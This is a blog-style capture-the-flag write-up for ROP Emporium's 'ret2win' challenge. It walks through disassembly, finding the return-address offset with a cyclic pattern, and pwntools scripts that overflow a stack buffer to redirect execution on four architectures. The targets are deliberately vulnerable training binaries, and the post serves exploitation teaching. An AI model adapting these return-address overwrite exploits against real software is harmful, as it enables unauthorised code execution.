--- 
layout: post 
title:  "[ROP EMPORIUM] ret2win"
date: "2021-05-5" 
tags: [pwn, ret2win, ROP-EMPORIUM] 
---

in this writeup I will resolve the challenge ret2win from ROP EMPORIUM. I will resolve this challenge for all
the architectures that ROP EMPORIUM provides (x86_64, x86, armv5, mipsel). In order to *win* this challenge I need to 
**overwrite the return address** of the **pwnme** function in order to redirect the flow of the program and forcing it to 
run the **ret2win** function.

# Before start
This is the first and simplest challenge of ROP EMPORIUM. In order to run all the binary with all the different architectures 
that ROP EMPORIUM provide to us we need to make some configuration and installation in order to be able to run the binary.
In the ROP EMPORIUM site is already well explained [here](https://ropemporium.com/guide.html) 

But quikly to set our machine to be able to run the binaries of all the architectures we shuld run the following commands:

```
sudo apt install libc6-i386

sudo apt install qemu-user
sudo apt install libc6-armel-cross
sudo apt install libc6-mipsel-cross
sudo mkdir /etc/qemu-binfmt
sudo ln -s /usr/arm-linux-gnueabi /etc/qemu-binfmt/arm
sudo ln -s /usr/mipsel-linux-gnu /etc/qemu-binfmt/mipsel

sudo apt install gdb gdb-multiarch

```

I also suggest to use gef gdb that provide additional features to GDB.



# x86_64 (64 bit) architecture

First what this program does when run ?
```bash 
eurus@warfare:~/Documents/ret2win_all/ret2win$ ./ret2win 
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> _
```
So with an educated guess we can think that giving to this program a well crafted input we can overwrite the rip stored into the stack 
and redirect the execution of the program.

We can see that the program has some intresting function by seeing the symbols of the binary.

```bash
eurus@warfare:~/Documents/ret2win_all/ret2win$ rabin2 -s ret2win 
[Symbols]

nth paddr      vaddr      bind   type   size lib name
―――――――――――――――――――――――――――――――――――――――――――――――――――――
35  0x000006e8 0x004006e8 LOCAL  FUNC   110      pwnme
36  0x00000756 0x00400756 LOCAL  FUNC   27       ret2win
65  0x00000697 0x00400697 GLOBAL FUNC   81       main
```

obviously the ret2win function is never called. 

First of all we need to see what is the offset of the stored rip respect to the user input.
I will not explain in detail where the vulnerability is, because this challenges were created specifically so as not to have to 
search for the bug or do reverse engineering.


```asm
            ; CALL XREF from main @ 0x4006d2
┌ 110: sym.pwnme ();
│   ; var void *buf @ rbp-0x20
│   0x004006e8      55             push rbp
│   0x004006e9      4889e5         mov rbp, rsp
│   0x004006ec      4883ec20       sub rsp, 0x20
│   0x004006f0      488d45e0       lea rax, [buf]
│   0x004006f4      ba20000000     mov edx, 0x20               ; 32 ; size_t n
│   0x004006f9      be00000000     mov esi, 0                  ; int c
│   0x004006fe      4889c7         mov rdi, rax                ; void *s
│   0x00400701      e87afeffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)
│   0x00400706      bf38084000     mov edi, str.For_my_first_trick__I_will_attempt_to_fit_56_bytes_of_user_input_into_32_bytes_of_stack_buffer_ 
│   0x0040070b      e840feffff     call sym.imp.puts           ; int puts(const char *s)
│   0x00400710      bf98084000     mov edi, str.What_could_possibly_go_wrong_ 
│   0x00400715      e836feffff     call sym.imp.puts           ; int puts(const char *s)
│   0x0040071a      bfb8084000     mov edi, str.You_there__may_I_have_your_input_please__And_dont_worry_about_null_bytes__were_using_read____n 
│   0x0040071f      e82cfeffff     call sym.imp.puts           ; int puts(const char *s)
│   0x00400724      bf18094000     mov edi, 0x400918           ; const char *format
│   0x00400729      b800000000     mov eax, 0
│   0x0040072e      e83dfeffff     call sym.imp.printf         ; int printf(const char *format)
│   0x00400733      488d45e0       lea rax, [buf]
│   0x00400737      ba38000000     mov edx, 0x38               ; '8' ; 56 ; size_t nbyte
│   0x0040073c      4889c6         mov rsi, rax                ; void *buf
│   0x0040073f      bf00000000     mov edi, 0                  ; int fildes
│   0x00400744      e847feffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
│   0x00400749      bf1b094000     mov edi, str.Thank_you_     ; 0x40091b ; "Thank you!" ; const char *s
│   0x0040074e      e8fdfdffff     call sym.imp.puts           ; int puts(const char *s)
│   0x00400753      90             nop
│   0x00400754      c9             leave
└   0x00400755      3             ret
```

we can see that we have a buffer of 32 bytes, as the program alredy tell us, and a read of 56 bytes at 0x00400744.

I wrote a little script that calculate for us how many bytes we need to write in order to reach the rip stored into the stack.

```python
from pwn import *
context.binary = elf = ELF('./ret2win')

p = elf.process()

g = cyclic_gen()

p.recvuntil('> ')
p.sendline(g.get(100))

p.shutdown()
p.wait()

c = Core('./core')

offset = g.find(p64(c.fault_addr))

log.info("OFFSET FIND > "+str(offset))

# This is the result:
# [*] OFFSET FIND > (40, 0, 40)
```

basically the cyclic_gen() with the get(100) method create a *de bruijn sequence* and quering the cyclig_gen() object stored in g with 
the method find(p64('c.fault_addr')) this object can calculate at what offset is the pattern stored in c.falut__addr **that contain the value 
of the rip where the program crashed**. And this value is our offset.

Here is a little representation of the stack:

```

           buffer                      ebp   ret     
<------   [                          ][    ][    ]
          de-bruijn-sequence-aaaaaaabaaacaaadaaaea....	   

top of                                           bottom of
stack                                                stack

```

So now that we have the offset we can craft our payload in order to win this challenge!


```python
from pwn import *
context.binary = elf = ELF('./ret2win')

p = elf.process()
gdb.attach(p)

offset = 40

payload = b'A'*offset + p64(elf.sym['ret2win'])

p.recv()
p.sendline(payload)
log.info(p.recvall())
```

This is the script that print for us the flag for the x86_64 version. The payload is only a padding of size 40 bytes (the offset calculated
before) and then the address of the ret2win function. 

**doing that when the pwnme function return instead returning to main it jump to the ret2win function**

this because we can see the **ret** function as: **pop eip** and so when return it pop into the register eip the value of the ret2win function
and so the program continue with the execution of the ret2win function.

# x86 (32 bit) architecture

In this case the offset is 44 bytes, and the payload is the same but with the different offset. The little script abow for calucating 
the offset work well also in this situation.

This is the script in order to print the flag.

```python
from pwn import *
offset = 44
context.binary = elf = ELF('./ret2win32')

p = elf.process()

payload = b'A'*offset + p32(elf.sym['ret2win'])

p.recv()
p.sendline(payload)
log.info(p.recvall())
```



# armv5 (32 bit) architecture
in this case we have an offset of 36 bytes. Same script but with a different offset:


```python
from pwn import *
context.binary = elf = ELF('./ret2win_armv5')

offset = 36
payload = b'V'*offset + p32(elf.sym['ret2win'])

p = elf.process()

p.recv()
p.sendline(payload)
log.info(p.recvall())
```



# mipsel (32 bit) architecture
Same 36 bytes offset same payload

```python
from pwn import *
context.binary = elf = ELF('./ret2win_mipsel')

p = elf.process()

offset = 36
payload = b'f'*offset+p32(elf.sym['ret2win'])

p.recv()
p.sendline(payload)
p.interactive()
```

# Conclusion

In this challenge, being the first and the simplest, the differences between the different architectures were not seen.
But in the next challenges these diffeences will emerge!



